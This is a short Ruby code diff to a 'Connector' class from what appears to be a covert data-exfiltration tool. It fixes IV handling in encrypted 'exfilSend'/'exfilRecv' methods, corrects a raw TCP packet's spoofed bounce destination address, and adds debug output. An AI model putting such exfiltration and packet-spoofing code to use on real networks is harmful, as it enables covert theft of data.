@@ -44,7 +44,8 @@ class Connector
 
   def exfilSend(payload)
     iv = @cipher.newIv
-    payload = @cipher.encrypt(iv,result)
+    payload = iv + @cipher.encrypt(iv,payload)
+    puts payload
     case @connection
       when "tcp"
         tcpSend(payload)
@@ -61,7 +62,9 @@ class Connector
   def exfilRecv(payload)
     iv = payload[0,16]
     data = payload[16..-1]
-    return @cipher.decrypt(iv, payload)
+    result = @cipher.decrypt(iv, payload)
+    puts result
+    return result
   end
 
   def sendAddr()
@@ -165,9 +168,10 @@ class Connector
     tcp_pkt.tcp_dst = @port
     tcp_pkt.tcp_src = 57359
     tcp_pkt.ip_saddr = @addr
-    tcp_pkt_ip_daddr = $tcpBounceIp
+    tcp_pkt.ip_daddr = $tcpBounceIp
     tcp_pkt.recalc
     tcp_pkt.to_w(@iface)
+	tcp_pkt.to_f("output")
     puts "finished tx"
   end
 
